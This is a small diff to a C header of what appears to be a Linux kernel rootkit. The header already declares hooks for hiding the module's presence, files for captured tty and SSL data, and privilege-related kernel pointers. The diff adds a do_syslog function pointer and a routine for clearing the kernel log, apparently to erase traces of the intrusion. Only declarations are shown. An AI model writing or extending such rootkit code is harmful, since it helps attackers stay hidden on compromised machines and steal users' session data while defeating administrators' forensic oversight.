@@ -61,6 +61,8 @@ typedef struct bpf_map *(*bpf_map_get_sg)(unsigned int);
 typedef struct bpf_map *(*bpf_map_get_sg)(struct fd);
 #endif
 
+typedef int (*do_syslog_sg)(int, char __user *, int, int);
+
 typedef unsigned long (*kallsyms_lookup_name_sg)(const char *name);
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
@@ -74,6 +76,7 @@ typedef void (*do__set_task_comm_sg)(struct task_struct *, const char *, bool);
 struct kernel_syscalls {
 	attach_pid_sg k_attach_pid;
 	bpf_map_get_sg k_bpf_map_get;
+	do_syslog_sg k_do_syslog;
 	kallsyms_lookup_name_sg k_kallsyms_lookup_name;
 	sys64 k_sys_setreuid;
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
@@ -97,6 +100,7 @@ void kv_crypto_engine_deinit(void);
 /** hooks, hiding presence and so */
 bool sys_init(void);
 void sys_deinit(void);
+void sys_do_syslog_clear(void);
 char *sys_get_ttyfile(void);
 char *sys_get_sslfile(void);
 
